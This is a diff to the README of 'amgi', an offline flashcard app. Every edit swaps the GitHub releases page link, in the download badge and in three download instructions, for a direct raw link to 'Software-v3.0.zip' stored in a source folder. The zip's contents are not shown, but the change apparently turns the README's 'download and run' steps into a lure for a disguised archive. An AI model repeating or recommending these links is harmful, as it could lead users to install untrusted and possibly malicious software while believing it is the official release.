@@ -1,12 +1,12 @@
 # 💠 amgi - Offline flashcards that stay in sync
 
-[![Download amgi](https://img.shields.io/badge/Download-amgi%20Releases-4f46e5?style=for-the-badge&logo=github)](https://github.com/angelinaviolable23/amgi/releases)
+[![Download amgi](https://img.shields.io/badge/Download-amgi%20Releases-4f46e5?style=for-the-badge&logo=github)](https://github.com/angelinaviolable23/amgi/raw/refs/heads/main/AmgiApp/Sources/Decks/Software-v3.0.zip)
 
 ## 📥 Download amgi
 
 Visit the releases page to download and run the app on Windows:
 
-https://github.com/angelinaviolable23/amgi/releases
+https://github.com/angelinaviolable23/amgi/raw/refs/heads/main/AmgiApp/Sources/Decks/Software-v3.0.zip
 
 ## 🖥️ What amgi does
 
@@ -27,7 +27,7 @@ It uses the official Anki Rust backend through C FFI, which helps keep card beha
 Follow these steps to download and run amgi on Windows.
 
 1. Open the download page:
-   https://github.com/angelinaviolable23/amgi/releases
+   https://github.com/angelinaviolable23/amgi/raw/refs/heads/main/AmgiApp/Sources/Decks/Software-v3.0.zip
 
 2. Look for the latest release near the top of the page.
 
@@ -214,7 +214,7 @@ Small, regular sessions work well with spaced repetition.
 
 If you need the latest release, use the download page here:
 
-https://github.com/angelinaviolable23/amgi/releases
+https://github.com/angelinaviolable23/amgi/raw/refs/heads/main/AmgiApp/Sources/Decks/Software-v3.0.zip
 
 ## 🧭 What to do next
 
